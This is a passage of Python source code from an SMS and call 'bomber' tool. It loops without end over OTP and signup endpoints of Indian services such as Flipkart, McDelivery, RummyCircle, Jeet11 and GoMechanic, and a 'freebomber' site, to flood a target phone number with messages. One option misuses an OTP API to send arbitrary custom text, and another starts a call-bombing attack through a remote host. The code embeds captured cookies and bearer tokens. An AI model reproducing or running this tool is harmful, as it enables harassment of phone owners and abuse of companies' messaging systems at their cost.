                    'gpv_pn_t': 'FLIPKART%3AHomePage',
                    's_cc': 'true',
                    'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
                    'S': 'd1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==',
                    's_sq': '%5B%5BB%5D%5D',
                }

                headers11 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'X-User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 FKUA/website/42/website/Desktop',
                    'Origin': 'https://www.flipkart.com',
                    'DNT': '1',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Referer': 'https://www.flipkart.com/',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'T=TI166051777263500361725355184726229621803065293637887642574388860456; SN=VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; s_cc=true; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; S=d1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==; s_sq=%5B%5BB%5D%5D',
                }

                json_data11 = {
                    'loginId': '',
                }

                json_data11['loginId'] = (f'+91{number}')
                
                response11 = requests.post('https://2.rome.api.flipkart.com/api/7/user/otp/generate', cookies=cookies11, headers=headers11, json=json_data11)
            
            
                
            def fastpronumber():

                cookies49990 = {
                    'cf_clearance': '1umnyCHQCgGscfF.g.AgAM.Z2PS46D94gkYu6i8vlos-1661862896-0-150',
                    'cf_chl_2': '83b4fe6455ca6de',
                    'cf_chl_prog': 'x13',
                }


                cookiesfinal422samay = {
                    'cf_clearance': 'VMJB.fGeLsyWnWm0DxZAr.bR7.YR7bMPSN4NDtsq3yQ-1661856628-0-150',
                    'cf_chl_2': 'd72589e28da9926',
                    'cf_chl_prog': 'x13',
                }



                cookiesfinalsamay = {
                    'cf_clearance': '1BPRcJRjs3Sce2cHlCCb2XoW31Uz6jCbPOVZuH.xong-1661839492-0-150',
                    'cf_chl_2': '950cd22602e8661',
                    'cf_chl_prog': 'x13',
                }


                cookies122samay = {
                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
                }
                #
                cookies10 = {
                    'cf_clearance': 'RF50.jR3wBBFu53pFPUj8MNdCrECGRdgFwblxz5xJr4-1661844685-0-150',
                }

                headers10 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # 'Cookie': 'cf_clearance=RF50.jR3wBBFu53pFPUj8MNdCrECGRdgFwblxz5xJr4-1661844685-0-150',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Cache-Control': 'max-age=0',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params10 = {
                    'sr': number,
                    'key': '@itztktricks',
                    'submit': 'Submit Query',
                }

                response10 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies10, headers=headers10)
                response101 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies122samay, headers=headers10)
                response102 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookiesfinalsamay, headers=headers10)
                response103 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookiesfinal422samay, headers=headers10)
                response1035 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies49990, headers=headers10)
                
                
            def industrialapi():
                #
                

                cookies8 = {
                    'ib_referral': 'https://www.google.com/',
                    'ib_utm_date_time': 'Invalid Date',
                    'ib_activity_time': '9-1-2022 10:59:39',
                }

                headers8 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.industrybuying.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.industrybuying.com/',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'ib_referral=https://www.google.com/; ib_utm_date_time=Invalid Date; ib_activity_time=9-1-2022 10:59:39',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                data8 = {
                    'username': number,
                }

                response8 = requests.post('https://www.industrybuying.com/user/api/send-otp/', cookies=cookies8, headers=headers8, data=data8)


            def snapmint():
                headers7 = {
                    'authority': 'api.snapmint.com',
                    'accept': '*/*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://snapmint.com',
                    'referer': 'https://snapmint.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data7 = {
                    'mobile': number,
                }
                response7 = requests.post('https://api.snapmint.com/v1/public/sign_up', headers=headers7, json=json_data7)

            def rummytime():
                headers6 = {
                    'authority': 'api.rummytime.com',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'content-type': 'application/json;charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://www.rummytime.com',
                    'referer': 'https://www.rummytime.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data6 = {
                    'mobile': number,
                }
                response6 = requests.post('https://api.rummytime.com/api/user/sendAppDownloadLink', headers=headers6, json=json_data6)

            def rummyapi():
                cookies5 = {
                    'sameSiteNoneSupported': 'true',
                    'LONG_VISITOR': '2787e267-cbdf-4032-8f2d-9645fb1cfec1',
                    'device.info.cookie': '{"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
                    'SSID': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8',
                    'SSIDuser': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0',
                    'ga24x7_pixeltracker': 'from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
                    '__utma': '3588915.1172103635.1660514286.1660514286.1660514286.1',
                    '__utmc': '3588915',
                    '__utmz': '3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
                    '__utmt_pageTracker': '1',
                    '__utmb': '3588915.1.10.1660514286',
                    'NA_IDVISIT': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
                    'NA_VISITOR': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
                    'isLivechat': '0',
                    'ga24x7_jsessionid': '"SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "',
                    'hash_parameter': '0',
                    'AWSALB': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
                    'AWSALBCORS': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
                    '_ga': 'GA1.2.1172103635.1660514286',
                    '_gid': 'GA1.2.482317890.1660514290',
                    '_gat_UA-3610156-1': '1',
                }

                headers5 = {
                    'authority': 'www.rummycircle.com',
                    'accept': '*/*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'cache-control': 'max-age=0',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    # Requests sorts cookies= alphabetically
                    # 'cookie': 'sameSiteNoneSupported=true; LONG_VISITOR=2787e267-cbdf-4032-8f2d-9645fb1cfec1; device.info.cookie={"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; SSID=SSID4b721211-5179-48db-9ca2-8cedf600d5c8; SSIDuser=SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0; ga24x7_pixeltracker=from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F; __utma=3588915.1172103635.1660514286.1660514286.1660514286.1; __utmc=3588915; __utmz=3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt_pageTracker=1; __utmb=3588915.1.10.1660514286; NA_IDVISIT=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; NA_VISITOR=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; isLivechat=0; ga24x7_jsessionid="SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "; hash_parameter=0; AWSALB=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; AWSALBCORS=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; _ga=GA1.2.1172103635.1660514286; _gid=GA1.2.482317890.1660514290; _gat_UA-3610156-1=1',
                    'dnt': '1',
                    'origin': 'https://www.rummycircle.com',
                    'referer': 'https://www.rummycircle.com/',
                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
                }

                json_data5 = {
                    'mobile': number,
                    'deviceId': 'ff2e30c7-0998-42c7-b2a7-4293c38bb040',
                    'deviceName': '',
                    'refCode': '',
                    'isPlaycircle': False,
                }
                response5 = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', cookies=cookies5, headers=headers5, json=json_data5)



            def nira():
            

                headers4 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'Origin': 'https://apply.nirafinance.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://apply.nirafinance.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data4 = {
                    'mobileNumber': number,
                    'otp': '',
                }

                response4 = requests.post('https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi', headers=headers4, json=json_data4)
                
                



            def macdonal():
                headers3 = {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'AddressID': '0',
                    'Authorization': 'Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d',
                    'BusinessModelID': '18',
                    'CartID': '0',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'CustomerID': '-1',
                    'DNT': '1',
                    'OrderTime': '0',
                    'OrderType': 'R',
                    'Origin': 'https://www.mcdelivery.co.in',
                    'PlatForm': 'msite',
                    'Referer': 'https://www.mcdelivery.co.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Storeid': '1',
                    'TokenTimestamp': '150820220314',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
                    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5Njk0NDQiLCJhcCI6Ijc1NDEzMDQzNCIsImlkIjoiMDA2YjEwMDQwMzAyMDVlNSIsInRyIjoiMDBjZmQyMGQ1NzgxODJlYjU4MTBjNWMxMmI5NDZkNzAiLCJ0aSI6MTY2MDUxMzQ1MTk5NH19',
                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'source': 'Web',
                }




                params3 = {
                    'isLoggedIn': 'false',
                    'businessModelID': '18',
                    'storeID': '1',
                }

                json_data3 = {
                    'MobileNo': number,
                }
                response3 = requests.post('https://services.mcdelivery.co.in/api/auth/sendotp', params=params3, headers=headers3, json=json_data3)

            def jeet():
                headers2 = {
                    'authority': 'api.jeet11.com',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://www.jeet11.com',
                    'referer': 'https://www.jeet11.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                    'x-client-app-type': 'JEET11',
                    'x-header-deviceid': '574a1fe8-a63a-421b-90f4-d73d0d276e60',
                }

                json_data2 = {
                    'phoneNo': number,
                    'countryAreaCode': '91',
                    'language': 'English',
                }
                response2 = requests.post('https://api.jeet11.com/account-service/external/v1.0.0/sendOtp', headers=headers2, json=json_data2)


            def gomechanic():
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYmYiOjE2NjA1MTU2NDAuMCwiaWF0IjoxNjYwNTE1NjQwLjAsImp0aSI6ImI0YmMzY2FmNWQxZWE5OWRjOTZiNDMzY2NjNDMwMjRlMDIzYjQwYzZiNDlmMTE3YmMwOTk4ZjYxZTdkMjVmMzYxNTVhZTlkMjE2MTZlNzk1IiwiZXhwIjoxNjYzMTA3NjQwLjAsImF1ZCI6IjMiLCJzY29wZXMiOltdLCJzdWIiOiIxNjYwNTE1NjQwODcifQ.DvSAJJYe6zUGovXqVK6zs-g7ccYE3O--anVOp-j5L60-Bvt4mXYavcgwUd1R8V-4zqVt-CRhhxUyvI227mCfHe4Jts9To5N-XT9PotfXchxlAZYGegwGs_xpSuFgsbYZYJw4DaQ1wT7d4JtDROyneeqoRUXAwORz78WBetYMT5H_aZGqxK2El7QDFO6vgXP0N7arIsOO8RDH2qT9a02f2R--2KSgtpZhnruA_XHC7ZIHjEC97rkuS-tZQwofgSLmiyJCTrpZjeJM7UF_Pvhq20ftz6VYHMVgsplKvjVDr4KCE7oJkWqt-qAJOVvugPlsW7hjhTDPLQg8MQf9VOuRA-aolE2EU1T1UwVzUSDQJuhYFpwWRmGHug5kgnQR8VjNi_631oPCutsW66fUA4MxYlvEaVzwtImpb0LAApQdnr6frNrXk3W_ARau2cTOXhpo8qk-z4JlA1Mrawgc_pbDYL_TpxMD6d545v6l4NbPTr7aV0IKng3DfAG_7oP_ktp5cngZO7rYvL6ElD4wprFbzob3PiFBwqBaOOmGKJaOMrhqaQhO0-wI6cyHUq4dE5f0lPhphe0WsqzoLfnh2dnAwCKeFeFzIMeCpJfvatzi53I49uLZUBBwJmzKYlUKSbx0jA0q4fCrrniW-gGkcjlv86k-lwUKqHq_2hF4Vr8MrwA',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://gomechanic.in',
                    'Referer': 'https://gomechanic.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data = {
                    'name': '',
                    'car_type_id': 115,
                    'mobile': number,
                    'location': 'Gurgaon',
                    'utm_source': '',
                    'source_id': 15,
                }
                response = requests.post('https://gomechanic.app/api/v1/oauth/leads/create_new_lead', headers=headers, json=json_data)


            try:
                while 1:
                    mycircle()
                    flipkart()
                    #trell()
                    #dunzo()
                    jeet()
                    apollo()
                    aakashin()
                    medbuzz()
                    jio()
                    hosing()
                    gomechanic()
                    kotakbank()
               #     bookmylauda()
                    nira()
                    currybhai()
                    macdonal()
                    moglix()
            
                    fastpronumber()
                    industrialapi()
                    rummyapi()
                    rummytime()
                    snapmint()
            except:
                _under_()
                chutmarike('Bombing stopped..')
                _under_()
                sys.exit()


        elif self.data_main==2:
            _cls_front_under()
            chutmarike('11 words only supported !')
            _under_()
            custommsg = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 digit number +91 : "+r).strip()
            newmsg = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the msg  : "+r)
            if len(newmsg)>11:
                chutmarike('please put only 11 words it is the maximum limit !')
                sys.exit()
            else:
                pass
            
            if len(custommsg)<11:
                pass
            else:
                chutmarike('Enter 10 digit number , indian number supported only')
                sys.exit()
            headers = {
                'authority': 'api.bighaat.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                'access-control-allow-origin': '*',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                'dnt': '1',
                'origin': 'https://www.bighaat.com',
                'referer': 'https://www.bighaat.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            }

            json_data = {
                'mobileNumber': custommsg,
                'hashcode':f'\
\
Team Sincryption\
\
msg= {newmsg}'
            }

            
            response = requests.post('https://api.bighaat.com/identity/api/otp/send-otp', headers=headers, json=json_data)
            _under_()
            chutmarike(f'Sms Send Successfully to Number '+Fore.GREEN+'+91'+Fore.GREEN+f'{custommsg}')
            _under_()
            sys.exit()
                
                
        elif self.data_main==3:
            _cls_front_under()
            custommsgcall = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 digit number +91 : "+r).strip()
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+custommsgcall+r)
            custommsgcall = requests.get(f'https://callbomb9899.herokuapp.com/freecall/{custommsgcall}')
            _under_()


        elif self.data_main==4:
            os.system('python update.py' if os.name=='nt' else 'python3 update.py')
            sys.exit()
            #

            
             
        elif self.data_main==5:
            chutmarike('Exiting ...')
            sys.exit()
            
        

    
try:
    samayuser = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Username : "+r)
    samaypassword = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Password : "+r)
except:
    sys.exit()

    
if __name__ == '__main__':
    bhai = Samay(samayuser,samaypassword)
    bhai.Passwordencrypt()
